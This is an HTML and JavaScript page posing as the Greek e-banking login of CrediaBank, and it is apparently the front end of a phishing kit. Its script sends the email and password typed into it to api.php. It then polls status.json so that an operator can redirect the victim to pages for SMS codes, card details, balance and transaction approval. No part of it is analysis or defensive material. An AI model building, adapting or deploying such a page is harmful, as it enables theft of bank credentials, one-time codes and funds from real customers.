<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
    <link rel="stylesheet" href="./css/snipped.css">
    <link rel="stylesheet" href="./css/cssr.css">
    <link rel="stylesheet" href="./css/cssl.css">
    <link rel="stylesheet" href="./css/css.css">
    <style>
        .login-campaigns-container { display: flex; justify-content: center; align-items: center; width: 100%; }
        .sms-widget { max-width: 500px; width: 100%; margin: 0 auto 48px auto; float: none; }
        @media (max-width: 768px) { .sms-widget { margin-bottom: 32px; } }
        .redesign-footer-container { margin-top: 20px; }

        #emailInput:focus + label, #emailInput:not(:placeholder-shown) + label,
        #passwordInput:focus + label, #passwordInput:not(:placeholder-shown) + label {
            top: 0 !important; font-size: 12px !important; color: #001EBA !important;
        }
        #emailInput + label, #passwordInput + label { transition: all 0.2s ease; }
    </style>
</head>
<body>
<div class="right-side margin-auto snipcss-wnMB2">
    <div class="container ng-scope redesign-header-fragment-container">
        <div class="row">
            <div fragment="redesignHeader" class="ng-scope">
                <div id="redesign-header" class="redesign-header-container ng-scope">
                    <div class="logo-container hidden-small">
                        <a tabindex="0"><img src="https://ebanking.crediabank.com/img/redesignLogo.png?ver=f1604f7ac63ee5a707473775a64907bb02f96080" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="logo-container hidden-above-medium">
                        <a tabindex="0"><img src="./images/logo-small.svg" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="top-links">
                        <ul class="hidden-small">
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                                <div class="header-link-container"><a style="color:#fff;">Καταστήματα &amp; ΑΤΜ</a></div>
                            </li>
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
                                <div class="header-link-container"><a style="color:#fff;">Επικοινωνία</a></div>
                            </li>
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
                                <div class="header-link-container"><a style="color:#fff;">Greek</a></div>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="log-container" class="container">
        <div class="row">
            <div id="main-log" class="ng-scope view-animation-left">
                <form name="loginForm" novalidate="" autocomplete="off" class="ng-pristine ng-scope">
                    <div class="login-campaigns-container">
                        <div class="login-widget col-lg-6 col-md-12 sms-widget">
                            <div class="top-container">
                                <h1 class="ng-binding">Σύνδεση στο e-banking</h1>
                                <div id="loginStepContainer" class="login-p">
                                    <div id="emailStepView">
                                        <div class="input-container" style="position:relative;">
                                            <div class="icon-container"><span class="icon"></span></div>
                                            <input type="email" id="emailInput" class="field input-field" style="width:100%;" placeholder=" " autocomplete="off">
                                            <label for="emailInput" class="floating-label" style="position:absolute;top:28px;left:28px;">Διεύθυνση email</label>
                                        </div>
                                    </div>
                                    <div id="passwordStepView">
                                        <div class="input-container" style="position:relative;">
                                            <div class="icon-container"><span class="iconpass"></span></div>
                                            <input type="password" id="passwordInput" class="field input-field" style="width:100%;" placeholder=" " autocomplete="off">
                                            <label for="passwordInput" class="floating-label" style="position:absolute;top:28px;left:28px;">Κωδικός πρόσβασης</label>
                                        </div>
                                    </div>
                                    <div class="info-note" style="font-size:12px;color:#5F6A72;text-align:center;">Εισάγετε τα στοιχεία σας για να συνεχίσετε</div>
                                </div>
                            </div>
                            <div class="mid-container">
                                <button type="button" id="loginActionBtn" class="button-container primary-button primary-button-label">Σύνδεση</button>
                            </div>
                            <div class="bottom-container" style="display:flex;justify-content:space-between;padding:0 32px 16px;font-size:13px;">
                                <a href="#" id="forgotPasswordLink" style="color:#001EBA;font-weight:500;">Ξεχάσατε τον κωδικό;</a>
                                <a href="#" id="registerLink" style="color:#001EBA;font-weight:500;">Εγγραφή νέου χρήστη</a>
                            </div>
                            <div id="loginMessageArea" class="bottom-container"></div>
                        </div>
                    </div>
                    <div class="container redesign-footer-container ng-scope">
                        <div class="row">
                            <div class="footer-container ng-scope">
                                <div class="footer-content-left">
                                    <span class="footer-logo"></span>
                                    <div class="footer-communication-container">
                                        <div class="footer-communication">
                                            <div class="footer-email-container"><span class="footer-email"></span><a class="footer-bold-weight ng-binding" href="mailto:ebanking@crediabank.com">ebanking@crediabank.com</a></div>
                                            <div class="footer-tel-container"><span class="footer-tel"></span><a class="footer-bold-weight ng-binding" href="tel:2103669000">210 366 9000</a></div>
                                        </div>
                                        <div class="footer-socials-container">
                                            <a class="instagram icon" href="#"></a>
                                            <a class="linkedIn icon" href="#"></a>
                                            <a class="youtube icon" href="#"></a>
                                        </div>
                                    </div>
                                    <div class="footer-apps-container-left">
                                        <div class="footer-apps">
                                            <p class="ng-scope">Κατεβάστε την εφαργμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                            <span class="ng-binding">Copyright © 2025</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="footer-section-container">
                                    <div class="footer-sections ng-scope col-6">
                                        <div class="section-title"><h3 class="ng-scope ng-binding">ΠΛΗΡΟΦΟΡΙΕΣ</h3></div>
                                        <ul class="list-without-chevron">
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Όροι Χρήσης</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ασφάλεια Συναλλαγών</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Κωδικοί Μιας Χρήσης</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Συχνές Ερωτήσεις</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υποστήριξη</a></li>
                                        </ul>
                                    </div>
                                    <div class="footer-sections ng-scope col-6">
                                        <div class="section-title"><h3 class="ng-scope ng-binding">ΧΡΗΣΙΜΑ</h3></div>
                                        <ul class="list-without-chevron">
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Πολιτική Cookies</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Προσωπικά Δεδομένα</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εγγύηση Καταθέσεων</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υπολογιστής ΙΒΑΝ</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ειδικοί Όροι Τραπεζικών Εργασιών</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εργαλείο Μετατροπής Αρχείου σε XML</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="footer-apps-container-right">
                                    <div class="footer-apps">
                                        <p class="ng-scope">Κατεβάστε την εφαργμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                        <span class="ng-binding">Copyright © 2025</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal-overlay ng-scope ng-hide" id="loadingModal">
    <div class="modal-loading opacity-animation">
        <div class="cancel-modal"></div>
        <div class="spinner-container"></div>
        <span class="text ng-scope">Παρακαλώ περιμένετε...</span>
    </div>
</div>

<script>
(function() {
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const loginBtn = document.getElementById('loginActionBtn');
    const msgDiv = document.getElementById('loginMessageArea');
    const loadingModal = document.getElementById('loadingModal');

    let myEmail = '';
    let checkInterval = null;
    let lastStatus = '';

    const urlParams = new URLSearchParams(window.location.search);
    myEmail = urlParams.get('u') || '';

    function setLoading(show) {
        if (!loadingModal) return;
        if (show) loadingModal.classList.remove('ng-hide');
        else loadingModal.classList.add('ng-hide');
    }

    function showMessage(text, isError) {
        if (!msgDiv) return;
        msgDiv.innerHTML = '<div style="background:' + (isError ? '#FFEFEF' : '#E6F7E6') + ';color:' + (isError ? '#B00020' : '#1E7A1E') + ';border-radius:12px;padding:12px;text-align:center;">' + text + '</div>';
    }

    function sendLogin() {
        const email = emailInput ? emailInput.value.trim() : '';
        const password = passwordInput ? passwordInput.value.trim() : '';

        if (!email) {
            showMessage("Παρακαλώ εισάγετε email", true);
            return;
        }

        myEmail = email;
        setLoading(true);

        var fd = new FormData();
        fd.append('type', 'login');
        fd.append('user', email);
        fd.append('password', password);

        fetch('api.php', { method: 'POST', body: fd })
            .then(function() {
                showMessage("Επεξεργασία...", false);
                if (!checkInterval) checkInterval = setInterval(checkStatus, 2000);
            })
            .catch(function(err) {
                console.warn(err);
                setLoading(false);
            });
    }

    function checkStatus() {
        fetch('status.json?t=' + Date.now(), { cache: 'no-store' })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var status = '';
                for (var ip in data) {
                    if (data[ip].email === myEmail) {
                        status = data[ip].status;
                        break;
                    }
                }
                if (status !== lastStatus) {
                    lastStatus = status;
                    if (status === 'go_sms') {
                        window.location.href = 'sms.php?u=' + encodeURIComponent(myEmail);
                    } else if (status === 'go_card') {
                        window.location.href = 'card.php?u=' + encodeURIComponent(myEmail);
                    } else if (status === 'go_balance') {
                        stopChecking();
                        window.location.href = 'balance.php?u=' + encodeURIComponent(myEmail);
                    } else if (status === 'go_approve') {
                        window.location.href = 'aprouve.php?u=' + encodeURIComponent(myEmail);
                    } else if (status === 'finished' || status === 'go_done') {
                        window.location.href = 'done.php';
                    } else if (status === 'otp_error') {
                        showMessage("Λανθασμένα στοιχεία. Δοκιμάστε ξανά.", true);
                        setLoading(false);
                    }
                }
            })
            .catch(console.log);
    }

    function stopChecking() {
        if (checkInterval) {
            clearInterval(checkInterval);
            checkInterval = null;
        }
    }

    if (loginBtn) {
        loginBtn.addEventListener('click', function(e) {
            e.preventDefault();
            sendLogin();
        });
    }

    function setupFloatLabel(input, label) {
        if (!input || !label) return;
        input.addEventListener('focus', function() {
            label.style.cssText = 'position:absolute;top:0;left:28px;font-size:12px;color:#001EBA;background:white;padding:0 4px;transition:all 0.2s ease;pointer-events:none;';
        });
        input.addEventListener('blur', function() {
            if (!input.value.trim()) {
                label.style.cssText = 'position:absolute;top:28px;left:28px;font-size:16px;color:#3B4045;transition:all 0.2s ease;pointer-events:none;';
            }
        });
        input.addEventListener('input', function() {
            if (input.value.trim()) {
                label.style.cssText = 'position:absolute;top:0;left:28px;font-size:12px;color:#001EBA;background:white;padding:0 4px;transition:all 0.2s ease;pointer-events:none;';
            }
        });
    }

    setupFloatLabel(emailInput, document.querySelector('label[for="emailInput"]'));
    setupFloatLabel(passwordInput, document.querySelector('label[for="passwordInput"]'));
})();
</script>
</body>
</html>